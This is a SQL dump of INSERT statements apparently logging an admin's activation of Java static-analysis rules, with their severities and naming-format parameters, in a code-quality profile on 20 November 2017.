INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3514, '2017-11-20 12:53:41.957', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:common-java:DuplicatedBlocks;ruleKey=common-java:DuplicatedBlocks;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfc_DbbGRdfPp-rUe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3515, '2017-11-20 12:53:42.046', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdAebbGRdfPp-rUf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3516, '2017-11-20 12:53:42.077', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:CallToDeprecatedMethod;ruleKey=squid:CallToDeprecatedMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdA9bbGRdfPp-rUg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3517, '2017-11-20 12:53:42.107', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:ClassVariableVisibilityCheck;ruleKey=squid:ClassVariableVisibilityCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdBabbGRdfPp-rUh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3518, '2017-11-20 12:53:42.127', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:CommentedOutCodeLine;ruleKey=squid:CommentedOutCodeLine;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdBvbbGRdfPp-rUi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3519, '2017-11-20 12:53:42.157', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:EmptyStatementUsageCheck;ruleKey=squid:EmptyStatementUsageCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdCNbbGRdfPp-rUj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3520, '2017-11-20 12:53:42.186', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:ForLoopCounterChangedCheck;ruleKey=squid:ForLoopCounterChangedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdCqbbGRdfPp-rUk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3521, '2017-11-20 12:53:42.208', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:HiddenFieldCheck;ruleKey=squid:HiddenFieldCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdDAbbGRdfPp-rUl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3522, '2017-11-20 12:53:42.238', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:LabelsShouldNotBeUsedCheck;ruleKey=squid:LabelsShouldNotBeUsedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdDebbGRdfPp-rUm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3523, '2017-11-20 12:53:42.27', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:MaximumInheritanceDepth;ruleKey=squid:MaximumInheritanceDepth;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_max=5;param_filteredClasses=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdD-bbGRdfPp-rUn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3524, '2017-11-20 12:53:42.299', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:MissingDeprecatedCheck;ruleKey=squid:MissingDeprecatedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdEbbbGRdfPp-rUo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3525, '2017-11-20 12:53:42.322', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:ModifiersOrderCheck;ruleKey=squid:ModifiersOrderCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdEybbGRdfPp-rUp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3526, '2017-11-20 12:53:42.35', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:ObjectFinalizeCheck;ruleKey=squid:ObjectFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdFObbGRdfPp-rUq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3527, '2017-11-20 12:53:42.381', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;ruleKey=squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdFtbbGRdfPp-rUr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3528, '2017-11-20 12:53:42.413', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:ObjectFinalizeOverridenCheck;ruleKey=squid:ObjectFinalizeOverridenCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdGNbbGRdfPp-rUs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3529, '2017-11-20 12:53:42.443', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:RedundantThrowsDeclarationCheck;ruleKey=squid:RedundantThrowsDeclarationCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdGrbbGRdfPp-rUt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3530, '2017-11-20 12:53:42.484', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S00100;ruleKey=squid:S00100;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdHUbbGRdfPp-rUu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3531, '2017-11-20 12:53:42.518', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S00101;ruleKey=squid:S00101;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdH2bbGRdfPp-rUv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3532, '2017-11-20 12:53:42.559', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S00107;ruleKey=squid:S00107;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_max=7;param_constructorMax=7;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdIfbbGRdfPp-rUw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3533, '2017-11-20 12:53:42.589', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S00108;ruleKey=squid:S00108;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdI9bbGRdfPp-rUx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3534, '2017-11-20 12:53:42.641', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S00112;ruleKey=squid:S00112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdJxbbGRdfPp-rUy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3535, '2017-11-20 12:53:42.665', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S00114;ruleKey=squid:S00114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdKJbbGRdfPp-rUz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3536, '2017-11-20 12:53:42.693', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S00115;ruleKey=squid:S00115;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdKlbbGRdfPp-rU0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3537, '2017-11-20 12:53:42.715', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S00116;ruleKey=squid:S00116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdK7bbGRdfPp-rU1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3538, '2017-11-20 12:53:42.737', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S00117;ruleKey=squid:S00117;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdLRbbGRdfPp-rU2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3539, '2017-11-20 12:53:42.753', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S00119;ruleKey=squid:S00119;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_format=^[A-Z][0-9]?$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdLhbbGRdfPp-rU3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3540, '2017-11-20 12:53:42.77', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S00120;ruleKey=squid:S00120;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_format=^[a-z]+(\.[a-z][a-z0-9]*)*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdLybbGRdfPp-rU4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3541, '2017-11-20 12:53:42.786', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S106;ruleKey=squid:S106;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdMCbbGRdfPp-rU5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3542, '2017-11-20 12:53:42.839', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1065;ruleKey=squid:S1065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdM3bbGRdfPp-rU6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3543, '2017-11-20 12:53:42.874', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1066;ruleKey=squid:S1066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdNabbGRdfPp-rU7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3544, '2017-11-20 12:53:42.896', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1068;ruleKey=squid:S1068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdNwbbGRdfPp-rU8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3545, '2017-11-20 12:53:42.925', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1075;ruleKey=squid:S1075;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdONbbGRdfPp-rU9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3546, '2017-11-20 12:53:42.967', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1118;ruleKey=squid:S1118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdO3bbGRdfPp-rU-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3547, '2017-11-20 12:53:43.019', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1125;ruleKey=squid:S1125;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdPrbbGRdfPp-rU_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3548, '2017-11-20 12:53:43.1', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1126;ruleKey=squid:S1126;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdQ8bbGRdfPp-rVA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3549, '2017-11-20 12:53:43.198', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1133;ruleKey=squid:S1133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdSebbGRdfPp-rVB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3550, '2017-11-20 12:53:43.253', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1134;ruleKey=squid:S1134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdTVbbGRdfPp-rVC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3551, '2017-11-20 12:53:43.333', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1135;ruleKey=squid:S1135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdUlbbGRdfPp-rVD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3552, '2017-11-20 12:53:43.38', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1141;ruleKey=squid:S1141;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdVUbbGRdfPp-rVE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3553, '2017-11-20 12:53:43.428', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1143;ruleKey=squid:S1143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdWEbbGRdfPp-rVF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3554, '2017-11-20 12:53:43.457', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1148;ruleKey=squid:S1148;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdWhbbGRdfPp-rVG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3555, '2017-11-20 12:53:43.481', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1149;ruleKey=squid:S1149;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdW5bbGRdfPp-rVH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3556, '2017-11-20 12:53:43.512', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1150;ruleKey=squid:S1150;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdXYbbGRdfPp-rVI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3557, '2017-11-20 12:53:43.536', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1153;ruleKey=squid:S1153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdXwbbGRdfPp-rVJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3558, '2017-11-20 12:53:43.568', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1155;ruleKey=squid:S1155;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdYQbbGRdfPp-rVK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3559, '2017-11-20 12:53:43.605', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1157;ruleKey=squid:S1157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdY1bbGRdfPp-rVL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3560, '2017-11-20 12:53:43.639', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1158;ruleKey=squid:S1158;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdZXbbGRdfPp-rVM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3561, '2017-11-20 12:53:43.664', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1161;ruleKey=squid:S1161;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdZwbbGRdfPp-rVN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3562, '2017-11-20 12:53:43.731', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1163;ruleKey=squid:S1163;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdazbbGRdfPp-rVO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3563, '2017-11-20 12:53:43.758', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1165;ruleKey=squid:S1165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdbObbGRdfPp-rVP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3564, '2017-11-20 12:53:43.784', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1168;ruleKey=squid:S1168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdbobbGRdfPp-rVQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3565, '2017-11-20 12:53:43.804', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1170;ruleKey=squid:S1170;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfdb8bbGRdfPp-rVR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3566, '2017-11-20 12:53:43.83', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1171;ruleKey=squid:S1171;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdcWbbGRdfPp-rVS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3567, '2017-11-20 12:53:43.857', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1172;ruleKey=squid:S1172;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdcxbbGRdfPp-rVT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3568, '2017-11-20 12:53:43.91', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1174;ruleKey=squid:S1174;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfddmbbGRdfPp-rVU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3569, '2017-11-20 12:53:43.941', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1175;ruleKey=squid:S1175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdeEbbGRdfPp-rVV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3570, '2017-11-20 12:53:43.968', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1181;ruleKey=squid:S1181;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdegbbGRdfPp-rVW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3571, '2017-11-20 12:53:43.994', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1182;ruleKey=squid:S1182;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfde6bbGRdfPp-rVX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3572, '2017-11-20 12:53:44.021', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1185;ruleKey=squid:S1185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdfVbbGRdfPp-rVY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3573, '2017-11-20 12:53:44.06', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1186;ruleKey=squid:S1186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfdf8bbGRdfPp-rVZ');
